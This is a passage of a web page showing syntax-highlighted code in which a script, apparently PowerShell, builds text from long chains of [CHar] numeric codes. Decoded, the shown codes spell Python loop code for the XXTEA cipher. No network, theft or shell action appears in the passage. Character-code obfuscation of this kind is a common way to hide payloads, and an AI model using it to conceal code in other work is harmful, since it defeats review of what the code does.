class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">62</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">38</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">102</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">103</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">58</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">77</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">88</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">112</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">48</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">99</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">95</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">105</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">51</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">50</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">43</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">77</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">88</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">40</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">116</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">107</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">121</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">44</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">41</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">122</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">46</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">97</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">108</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">101</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">118</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">91</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">93</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">114</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">111</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">117</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">110</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">100</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">115</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">45</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">61</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">49</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">10</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span class="hljs-selector-attr">[CHar]</span><span class="hljs-number">32</span>+<span 